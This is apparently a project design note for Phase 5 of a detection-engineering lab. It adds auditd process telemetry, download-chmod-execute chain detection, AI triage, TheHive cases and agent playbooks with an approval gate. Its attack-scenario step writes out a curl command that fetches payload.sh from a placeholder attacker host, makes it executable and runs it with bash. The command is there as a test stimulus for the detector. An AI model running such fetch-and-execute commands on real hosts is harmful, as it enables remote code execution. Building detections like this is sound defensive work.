# Phase 5 — Endpoint Telemetry (Process-Focused)

> [!NOTE]
> This document preserves Phase5-specific implementation history and
> validation context. The [main Roadmap](roadmap.md) is authoritative for current
> status, active priority, incomplete work, and Done Criteria.

## 🎯 Goal

Evolve from log-based detection to **process-based detection**

---

## 🧠 Concept

- Detect = deterministic
- AI = triage / analysis
- DFIR = follow-on (Velociraptor)

Phase5 strengthens visibility:

👉 **Introduce process visibility**

---

## 🏗️ Architecture

```text
scenario
→ attack
→ endpoint telemetry (auditd)
→ normalized process events
→ detection (process chain)
→ incident
→ triage (AI)
→ case.json (process enrichment)
→ TheHive
→ action planning
→ playbook
→ executor
→ collection request generation (Velociraptor adapter boundary)
```

---

## 🔧 Scope

### ✅ Do (Phase5 MVP)

- Collect process execution with auditd (execve)
- Normalize process events (ISO 8601 timestamps)
- Detect process chains (behavior)
- Produce incident / triage / case outputs per run
- Add a process timeline and summary to the case
- Adjust severity based on process evidence
- Integrate the case and observables with TheHive
- Generate a playbook with action-agent
- Execute the playbook with executor-agent
- Generate a schema-validated Velociraptor `collection_request.json`; direct API execution and live result ingestion are outside this boundary
- Record detection / triage / action / execution in decision_log

### ❌ Do NOT

- Reproduce a full EDR
- Implement network and file telemetry at the same time
- Add a large number of scenarios
- Provide broad lateral-movement coverage
- fully autonomous containment
- Execute the Velociraptor API or claim live collection from the request-generator boundary

---

## 🚀 Implementation Steps

### Step1: Introduce auditd

Purpose:

- Collect execve events
- Provide process-level visibility

---

### Step2: Attack Scenario

```bash
curl -o /tmp/payload.sh http://<attacker_ip>/payload.sh
chmod +x /tmp/payload.sh
/bin/bash /tmp/payload.sh
```

---

### Step3: Normalization

```json
{
  "event_type": "process_exec",
  "timestamp": "2026-03-24T08:08:09Z",
  "host": "ubuntu-victim01",
  "pid": 1234,
  "ppid": 1200,
  "user": "victim01",
  "exe": "/usr/bin/curl",
  "command_line": "curl ...",
  "cwd": "/home/victim01",
  "source": "auditd"
}
```

---

### Step4: Detection (Behavior)

Rule:

```text
download → chmod → execute
```

Characteristics:

- Correlate a chain of multiple events
- Use a five-minute time window
- Correlate by host and user

---

### Step5: Detection Output

```json
{
  "detection_type": "suspicious_download_chmod_execute",
  "severity": "high",
  "download_attempts": 2,
  "timeline": [...]
}
```

---

### Step6: Case Enrichment

```json
"process_summary": {
  "host": "ubuntu-victim01",
  "user": "victim01",
  "download_attempts": 2,
  "executed_payload": "/bin/bash /tmp/payload.sh",
  "detection_type": "suspicious_download_chmod_execute"
},

"process_timeline": [
  {
    "timestamp": "2026-03-24T08:08:09Z",
    "command_line": "curl ..."
  },
  {
    "timestamp": "2026-03-24T08:08:27Z",
    "command_line": "/bin/bash /tmp/payload.sh"
  }
]
```

---

### Step7: Severity Logic

```text
deterministic (process chain)
→ triage (verdict / risk_score)
→ determine severity
```

Example:

- download → chmod → execute → **high**
- verdict=malicious + risk_score>=80 → **high**

---

### Step8: TheHive

- Create a case
- Add observables
  - ip
  - url
  - hostname
  - filename
  - user(other)

👉 Present the process-based case from a SOC perspective

---

### Step9: Action Planning / Playbook

```text
triage
→ action-agent
→ playbook.steps
```

Example:

```json
{
  "id": "step-1",
  "type": "request_dfir_collection",
  "auto_executable": true,
  "params": {
    "target": "ubuntu-victim01",
    "target_file": "/tmp/payload.sh"
  },
  "metadata": {
    "reason": "Payload execution requires DFIR collection.",
    "confidence": "high",
    "status": "planned"
  }
}
```

---

### Step10: Executor / Approval

- Execute the playbook with executor-agent
- Execute safe steps automatically
- Place sensitive steps behind an approval gate

Example:

- request_dfir_collection → auto
- alert_soc_team → auto
- review_payload_execution → auto
- consider_host_isolation → pending_approval

---

### Step11: Velociraptor Request Adapter

- Map the Case and action context to requested artifacts such as `Linux.BashHistory` and `Linux.ProcessList`
- Validate and emit `collection_request.json`
- Keep actual Velociraptor API execution and live collection-result ingestion as follow-on work

👉 The implemented boundary is on-demand request generation, not continuous or live collection

---

## 📂 Directory Update

```text
data/runs/<run_id>/
  process_events.json
  interesting_process_events.json
  process_chain_hits.json
  incident.json
  triage_result.json
  case.json
  action_result.json
  collection_request.json
  decision_log.json
```

---

## 🎯 Historical Detection Targets

This list records the Phase5 planning targets. Current implementation status and
active priorities are owned by the [Main Roadmap](roadmap.md).

1. download → chmod → execute: implemented in Phase5
2. standalone suspicious shell execution: not implemented as an independent
   Phase5 Linux detection target; shell-related process filtering alone is not
   a detection
3. transition to behavior-feature-based detection: implemented in Phase6 for
   the current bounded paths; broader detection expansion remains separate work

---

## 🧠 Detection Evolution

```text
Phase4:
log-based
↓
Phase5:
process-based
behavior-based
run-based
```

---

## 📦 Tools

### Primary

- auditd

### Investigation Request Boundary

- Velociraptor adapter (`collection_request.json` generation only)

### Case / Workflow

- TheHive
- action-agent
- executor-agent

---

## ✅ Done Criteria

- auditd can collect execve events
- Process events are serialized as JSON with ISO timestamps
- Process-chain detection works
- The case includes a process timeline and summary
- Severity is adjusted based on process evidence
- The case and observables can be sent to TheHive
- action-agent can generate a playbook
- executor-agent can execute a playbook
- Approval-required steps can be separated
- The Velociraptor adapter can generate a schema-validated collection request without claiming direct API execution or live result ingestion
- decision_log retains detection / triage / action / execution records

---

## 🔥 First Step

```text
Confirm that auditd collects execve logs
```

---

## 💡 Why Phase5 Matters

- Makes the attack sequence visible
- Detects behavior rather than isolated log entries
- Greatly improves the explanatory value of the case
- Evolves toward an EDR-like detection model
- Separates planning, execution, and approval
- Establishes the foundation for Phase6 behavior features and the improvement loop
